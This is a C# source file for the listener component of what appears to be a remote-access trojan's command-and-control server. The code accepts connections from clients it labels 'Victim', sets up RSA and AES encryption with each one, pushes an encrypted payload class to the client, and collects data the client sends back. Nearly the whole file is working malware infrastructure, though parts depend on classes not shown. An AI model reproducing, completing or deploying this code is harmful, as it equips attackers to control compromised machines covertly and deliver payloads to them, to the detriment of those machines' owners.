using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;

public class Listener
{
    //SOCKET
    Socket socket;
    int MAX_BUFFER_LENGTH = 65536;

    //STATUS
    public bool is_listen = false;

    //EVENT
    public delegate void ReceivedEventHandler(Listener l, Victim v, (int Command, int Param, int DataLength, byte[] MessageData) buffer, int rec);
    public event ReceivedEventHandler Received;
    public delegate void DisconnectedEventHandler(Listener l, Victim v);
    public event DisconnectedEventHandler Disconnected;

    public Listener()
    {
        socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    }

    //Start listen.
    public void Start(string ip, int port)
    {
        socket.SendTimeout = -1;
        socket.ReceiveTimeout = -1;
        socket.Bind(new IPEndPoint(IPAddress.Any, port));
        is_listen = true;

        socket.Listen(10000);
        socket.BeginAccept(new AsyncCallback(AcceptCallback), socket);
    }

    //Stop listen.
    public void Stop()
    {
        socket.Close();
        is_listen = false;
    }

    //Connect to C2 server
    public void Connect(string ip, int port, string password)
    {

    }

    void AcceptCallback(IAsyncResult ar)
    {
        Socket handler = (Socket)ar.AsyncState;
        try
        {
            Socket client = handler.EndAccept(ar);
            Victim v = new Victim(client);
            handler.BeginAccept(new AsyncCallback(AcceptCallback), handler); //Loop
            v.socket.BeginReceive(v.buffer, 0, MAX_BUFFER_LENGTH, SocketFlags.None, new AsyncCallback(ReadCallback), v);
        }
        catch (ObjectDisposedException ex)
        {
            //Do nothing
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message, "AcceptCallback()", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }

    private void ReadCallback(IAsyncResult async_result)
    {
        Victim v = (Victim)async_result.AsyncState;

        try
        {
            //int rec = v.socket.EndReceive(async_result);
            Socket socket = v.socket;
            RP rp = null;
            int receive_length = 0;
            byte[] static_receiveBuffer = new byte[MAX_BUFFER_LENGTH];
            byte[] dynamic_receiveBuffer = new byte[] { };

            string[] key_pairs = Crypto.CreateRSAKey();
            v.KeyPairs = (key_pairs[0], key_pairs[1]);
            string b64_PublicKey = C1.StrE2B64Str(v.KeyPairs.PublicKey);
            v.Send(1, 0, b64_PublicKey); //PARAM: 1 -> RSA PUBLIC KEY

            do
            {
                static_receiveBuffer = new byte[MAX_BUFFER_LENGTH];
                receive_length = v.socket.Receive(static_receiveBuffer);
                C2.received += receive_length;
                dynamic_receiveBuffer = CombineBytes(dynamic_receiveBuffer, 0, dynamic_receiveBuffer.Length, static_receiveBuffer, 0, receive_length);
                
                if (receive_length <= 0)
                    break;
                else if (dynamic_receiveBuffer.Length < RP.HEAD_LENGTH)
                    continue;
                else
                {
                    var head_info = RP.GetHeadInfo(dynamic_receiveBuffer);
                    while (dynamic_receiveBuffer.Length - RP.HEAD_LENGTH >= head_info.DataLength)
                    {
                        rp = new RP(dynamic_receiveBuffer);
                        dynamic_receiveBuffer = rp.MoreData;
                        head_info = RP.GetHeadInfo(dynamic_receiveBuffer);
                        if (rp.Command == 0 && rp.Param == 0) //OFFLINE
                        {
                            socket.Send(new RP(0, 0, Encoding.UTF8.GetBytes("Farewell")).GetBytes());
                            Disconnected(this, v);
                            break;
                        }
                        else if (rp.Command == 1) //KEY EXCHANGE
                        {
                            if (rp.Param == 0) //SEND RSA PUBLIC KEY
                            {
                                C2.form1.SystemStatus($"Accepted New client[{v.rAddr}], start key exchange..."); //WRITE STATUS
                                C2.form1.KeyExchangeStatus(v, "Start key exchange.");

                                string[] key_pair = Crypto.CreateRSAKey();
                                C2.form1.KeyExchangeStatus(v, "Generated RSA key pairs.");

                                v.KeyPairs = (key_pair[0], key_pair[1]);
                                string b64_publicKey = v.KeyPairs.PublicKey;
                                socket.Send(new RP(1, 0, C1.StrE2B64Byte(b64_publicKey)).GetBytes());
                                C2.form1.KeyExchangeStatus(v, "Sent RSA public key");
                            }
                            else if (rp.Param == 1) //RECEIVE ENCRYPTED AES KEY
                            {
                                /* 
                                 * THE ENCRYPTED AES KEY SHOULD BE IN BASE64 FORM,
                                 * AFTER DECRYPTED IT SHOULD BE BYTES FORM
                                 */
                                string payload = Encoding.UTF8.GetString(rp.GetMessage().msg_data);
                                payload = Encoding.UTF8.GetString(Convert.FromBase64String(payload));
                                string[] _split = payload.Split('|');
                                string b64_AES = _split[0];
                                string b64_IV = _split[1];
                                C2.form1.KeyExchangeStatus(v, "Received encrypted AES key, start decryption.");

                                byte[] encrypted_AES = Convert.FromBase64String(b64_AES);
                                byte[] encrypted_IV = Convert.FromBase64String(b64_IV);

                                byte[] decrypted_AESKey = Crypto.RSADecrypt(encrypted_AES, v.KeyPairs.PrivateKey);
                                byte[] decrypted_IV = Crypto.RSADecrypt(encrypted_IV, v.KeyPairs.PrivateKey);

                                v._AES = (decrypted_AESKey, decrypted_IV);
                                C2.form1.KeyExchangeStatus(v, "Get AES key plain text.");

                                //SEND ACKNOWLEDGEMENT
                                string cipher_txt = Crypto.AESEncrypt("HelloWorld!", v._AES.Key, v._AES.IV);
                                v.Send(1, 2, Encoding.UTF8.GetBytes(cipher_txt));
                                C2.form1.KeyExchangeStatus(v, "Finished.");

                            }
                            else if (rp.Param == 3)
                            {
                                string name = "Basic";
                                string class_str = C1.GetPayload(name);
                                string _payload = $"{name}|{Encoding.UTF8.GetString(C1.StrE2B64Byte(class_str))}";

                                _payload = Crypto.AESEncrypt(_payload, v._AES.Key, v._AES.IV);
                                v.Send(2, 0, Encoding.UTF8.GetBytes(_payload));
                            }
                        }
                        else if (rp.Command == 2 && rp.Param == 0) //HANDLE DATA
                        {
                            Received(this, v, rp.GetMessage(), 0);
                        }
                        else if (rp.Command == 3 && rp.Param == 0) //INIT - RECEPTION CLIENT
                        {

                        }
                    }
                }
            } while (receive_length > 0);
        }
        catch (Exception e)
        {
            //MessageBox.Show(e.Message);
        }
        finally
        {
            Disconnected(this, v);
        }
    }

    private byte[] CombineBytes(byte[] firstBytes, int firstIndex, int firstLength, byte[] secondBytes, int secondIndex, int secondLength)
    {
        byte[] bytes = null;
        MemoryStream ms = new MemoryStream();
        ms.Write(firstBytes, firstIndex, firstLength);
        ms.Write(secondBytes, secondIndex, secondLength);
        bytes = ms.ToArray();
        ms.Close();
        return bytes;
    }
}